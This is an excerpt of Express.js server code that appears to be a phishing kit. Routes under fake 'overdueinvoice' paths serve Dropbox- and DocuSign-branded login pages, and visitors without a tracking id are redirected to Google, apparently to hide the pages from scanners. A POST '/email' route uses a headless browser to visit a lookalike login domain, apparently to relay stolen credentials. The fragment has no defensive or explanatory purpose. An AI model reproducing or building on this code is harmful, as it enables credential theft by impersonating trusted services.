...
app.get("/dropbox/login/authfiles/overdueinvoice.ppxx/yf7tfYFYURDrddfUKfutftydDGFidythhegujhrkftdykgvb/icyfkytfidtkdfjfrd", (req, res) => {
  if (!req.query.id) {
    // Redirect to Google
    return res.redirect("https://www.google.com");
  } else {
    res.sendFile(path.join(__dirname, "views", "/dropbox/index.html"));
  }
});

app.get("/docusign/login/authfiles/overdueinvoice.ppxx/yf7tfYFYURDrddfUKfutftydDGFidythhegujhrkftdykgvb/icyfkytfidtkdfjfrd", (req, res) => {
  if (!req.query.id) {
    // Redirect to Google
    return res.redirect("https://www.google.com");
  } else {
...
app.post("/email", async (req, res) => {
  ...
  try {
    ...
    await page.goto("https://login.tractiioncp.com/bfnnwnmq",{ waitUntil: 'networkidle2' });
